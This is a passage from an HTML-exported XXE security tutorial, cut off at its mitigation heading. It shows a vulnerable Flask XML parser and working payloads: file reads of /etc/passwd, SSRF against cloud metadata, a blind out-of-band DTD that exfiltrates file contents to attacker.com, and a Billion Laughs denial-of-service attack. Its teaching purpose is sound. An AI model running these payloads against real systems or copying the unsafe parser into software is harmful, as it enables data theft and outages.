id="2d5562ad-76f0-8082-b78e-fb1ead067754" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>High Impact</strong>: Can lead to complete file system access</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8056-ab36-eb6cb16f1ca8" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Common</strong>: Found in many XML processing applications</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8034-8f6c-c85d58e716bf" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Can lead to SSRF</strong>: May enable access to internal networks</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c1-9afe-c0fb0e5d1788" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Hard to Detect</strong>: May not show obvious errors</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8091-bea8-f65de63541ff" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Widespread</strong>: Affects any application processing XML</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8001-a345-c54ae2683846"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8009-bc53-d0b946351ff5" class=""><strong>What is XXE</strong></h2></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e6-8510-e6b100140f2a" class="">XXE (XML External Entity) occurs when an XML parser processes external entities defined in XML documents without proper restrictions, allowing attackers to read files, perform network requests, or cause denial of service.</p></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80f0-b038-d4277038ccbd" class=""><strong>Basic Example</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80b5-aadc-e6a7ec689be2" class=""><strong>Vulnerable XML Parser:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-802c-8914-f7af668fad1a" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from xml.etree.ElementTree import parse
+from flask import request
+
+@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])
+def upload_file():
+    xml_data = request.data
+    tree = parse(xml_data)  # XXE vulnerability!
+    return &quot;OK&quot;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-804f-99cd-f95ac9a0b1c8" class=""><strong>Attack:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-804e-918b-e9694fe939bb" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8039-a1fa-f0e05d1d67a5" class=""><strong>Result:</strong> Application reads and returns contents of <code>/etc/passwd</code></p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80e3-bff9-c51e3a0cb436"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8003-b0bf-daf66a42b622" class=""><strong>How XXE Works</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-808a-b98b-d27544e0e6ba" class=""><strong>XML Entities</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8005-9958-f59cc7eaf871" class=""><strong>Internal Entities:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80d8-9276-d9568311d560" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY name &quot;value&quot;&gt;
+</code></pre></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8067-aa23-fa23baaf2f40" class="bulleted-list"><li style="list-style-type:disc">Defined within the document</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-802f-ade9-c1130168854a" class="bulleted-list"><li style="list-style-type:disc">Relatively safe (with proper validation)</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80b5-9403-e4db005f8291" class=""><strong>External Entities:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-805d-80cb-e3895dddd8e5" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY xxe SYSTEM &quot;file:///path/to/file&quot;&gt;
+</code></pre></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8067-8905-e33ff5e0ebf6" class="bulleted-list"><li style="list-style-type:disc">Reference external resources</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80bc-9815-d864f6fb7b63" class="bulleted-list"><li style="list-style-type:disc">Can be dangerous if not restricted</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e7-a9f3-f7117e611b35" class=""><strong>Parameter Entities (DTD only):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-805f-88a2-e762d0074cf2" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY % xxe SYSTEM &quot;file:///path/to/file&quot;&gt;
+</code></pre></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8071-acda-d238f1d83d39" class="bulleted-list"><li style="list-style-type:disc">Used in DTD definitions</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8099-a4b4-d0a0f9fee578" class="bulleted-list"><li style="list-style-type:disc">Can be chained for complex attacks</li></ul></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80f2-b86e-d27f9bb4441a" class=""><strong>Attack Flow</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-803c-a684-dcf8bec0eb4d" class=""><strong>1. Attacker submits malicious XML:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-805b-976b-c837d7851572" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8069-98f6-f94bb8149423" class=""><strong>2. XML Parser Processes DTD:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80a2-8599-dfc05a80aa77" class="bulleted-list"><li style="list-style-type:disc">Parser reads DOCTYPE declaration</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80fa-9c22-f73301448ee0" class="bulleted-list"><li style="list-style-type:disc">Defines external entity <code>xxe</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80ea-ba6f-ef0f2fc96b3e" class="bulleted-list"><li style="list-style-type:disc">Resolves <code>file:///etc/passwd</code> URI</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8057-8dba-c5593a48a93d" class=""><strong>3. Entity Expansion:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8022-bc48-cc94bbf5a66b" class="bulleted-list"><li style="list-style-type:disc">Parser expands <code>&amp;xxe;</code> entity</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-803f-844b-ddb0eda6364c" class="bulleted-list"><li style="list-style-type:disc">Replaces with contents of <code>/etc/passwd</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8050-bb63-e23d135ca75e" class="bulleted-list"><li style="list-style-type:disc">Includes sensitive file contents in response</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80ad-83ee-f37efab9c016" class=""><strong>4. Attacker Receives Data:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-808f-8fd5-d10cfd36e02c" class="bulleted-list"><li style="list-style-type:disc">File contents returned in XML response</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-802c-b151-e7632524b9c3" class="bulleted-list"><li style="list-style-type:disc">Attacker extracts sensitive information</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-801f-a4c8-e8be5810cf6c"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-80df-be1c-f34c50930f34" class=""><strong>Types of XXE Attacks</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-805e-9003-e6fb567a5f7d" class=""><strong>1. File Disclosure (In-Band)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80eb-8607-e460bdaccfaf" class=""><strong>Description:</strong> Attacker reads local files, with file contents returned directly in the response.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-806b-97a9-cba1f3875464" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80c7-a8f1-dde132e2448a" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-805f-ba9a-df426a324590" class=""><strong>Result:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8016-a0b0-ec25b2509dde" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;foo&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...&lt;/foo&gt;
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80a2-8073-fc120afa4b5b"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8061-9a8b-f22699d631a0" class=""><strong>2. SSRF (Server-Side Request Forgery)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8097-8aee-dd127885173f" class=""><strong>Description:</strong> Attacker makes the server perform HTTP requests to internal or external resources.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80fa-b2e5-f6fb0354f50c" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8005-8c36-c0dc43755abc" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &quot;http://internal-server:8080/admin&quot;&gt;
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d7-be2f-d661671f5ec4" class=""><strong>Result:</strong> Server makes HTTP request to <code>http://internal-server:8080/admin</code></p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-806a-afe3-fa5772c92f43"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80af-a458-d697a8d3aad1" class=""><strong>3. Blind XXE (Out-of-Band)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d6-a6ce-efa97a56efeb" class=""><strong>Description:</strong> Attacker extracts data indirectly via external servers, when file contents aren&#x27;t returned directly.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e2-ba57-cfda281d2083" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80aa-8c2f-d5954383ce06" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % xxe SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt;
+  %xxe;
+]&gt;
+&lt;foo&gt;test&lt;/foo&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-808d-8b9e-d15a70c1528e" class=""><strong>evil.dtd (on attacker&#x27;s server):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8096-b012-c210b8234208" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://attacker.com/?%file;&#x27;&gt;&quot;&gt;
+%eval;
+%exfil;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8038-bec6-df52a68444fb" class=""><strong>Result:</strong> File contents sent to attacker&#x27;s server via HTTP request</p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-807e-a11b-d19add74197c"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8027-8805-eb24ab566b60" class=""><strong>4. Denial of Service (DoS)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-800d-9e13-fea1a4b58869" class=""><strong>Description:</strong> Attacker causes entity expansion attacks (Billion Laughs attack) to exhaust server resources.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80cf-97b6-f371644fca76" class=""><strong>Example (Billion Laughs Attack):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80bf-8452-cf883f54ea7a" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE lolz [
+  &lt;!ENTITY lol &quot;lol&quot;&gt;
+  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
+  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
+  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
+  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
+  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
+  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
+  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
+  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
+]&gt;
+&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80ce-bf99-d13fc64c69eb" class=""><strong>Result:</strong> Massive entity expansion exhausts memory/CPU</p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80bf-ab22-cfc697a98092"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8075-81a9-ed55bf1af1cc" class=""><strong>Impact of XXE</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80c7-ac7a-c46987a465cf" class=""><strong>1. Information Disclosure</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-803b-841c-c5f978268d5c" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8052-a967-e1c6c418a206" class="bulleted-list"><li style="list-style-type:disc">Read sensitive files (passwords, keys, configs)</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8022-8d4c-e675ae836e2c" class="bulleted-list"><li style="list-style-type:disc">Access source code</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8065-894a-ca262fe1532e" class="bulleted-list"><li style="list-style-type:disc">Extract database credentials</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d2-8db3-df13a471a18e" class=""><strong>Example Files:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80dc-887c-e2b7a26c3f7e" class="bulleted-list"><li style="list-style-type:disc"><code>/etc/passwd</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e4-a4fb-c64e3beab5f5" class="bulleted-list"><li style="list-style-type:disc"><code>/etc/shadow</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80b1-a09e-ef422af37fa8" class="bulleted-list"><li style="list-style-type:disc">Application configuration files</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8078-b0d4-e5940b9ab123" class="bulleted-list"><li style="list-style-type:disc">Private keys</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c1-80be-d907c38ad4eb" class="bulleted-list"><li style="list-style-type:disc">Database credentials</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-803a-b8f1-cf99478eefc0"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-800b-a18d-c9566e0de1c9" class=""><strong>2. Server-Side Request Forgery (SSRF)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8057-8bd5-e0c8c61aa80e" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d3-8f7c-f643244d02b1" class="bulleted-list"><li style="list-style-type:disc">Access internal services</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-809d-a23c-cd00679b6a7c" class="bulleted-list"><li style="list-style-type:disc">Port scanning</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-801f-adee-ecbbcff99dbe" class="bulleted-list"><li style="list-style-type:disc">Access cloud metadata APIs</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8029-8da6-d1ed01e14ae7" class="bulleted-list"><li style="list-style-type:disc">Internal network reconnaissance</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8081-b3b0-d9f874a23993" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80b0-b071-c8926c567b5e" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/&quot;&gt;
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80ae-adb9-e1ecf2b28fcf"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80ad-b85e-c15aa5746da2" class=""><strong>3. Denial of Service</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-803d-a129-f2af164240d2" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c4-b117-f55957b738df" class="bulleted-list"><li style="list-style-type:disc">Server resource exhaustion</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80ec-ab7b-eb5a8e782c3e" class="bulleted-list"><li style="list-style-type:disc">Application unavailability</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8006-8fbd-ca29a977a0d9" class="bulleted-list"><li style="list-style-type:disc">Performance degradation</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8063-92a9-e8515dd9c10a"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-805f-8f55-f5dc91d6bf7b" class=""><strong>4. Remote Code Execution (Rare)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80fc-a966-d33496dd283d" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-801f-abec-dd140db89228" class="bulleted-list"><li style="list-style-type:disc">In some cases, XXE can lead to RCE</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-803f-a276-c2b5b14eb0a9" class="bulleted-list"><li style="list-style-type:disc">Often requires specific configurations</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-802a-952c-c9e7aaa599eb" class="bulleted-list"><li style="list-style-type:disc">More common in PHP applications</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-809f-9f10-c7eb7c8581ee"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-80a7-b6d2-c1ea85f92927" class=""><strong>Mitigation Strategies</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80d2-9e71-fbf6ea3d7375" class=""><strong>1. Disable External Entities (Primary Defense)</strong></h3></div><div style="display:contents" 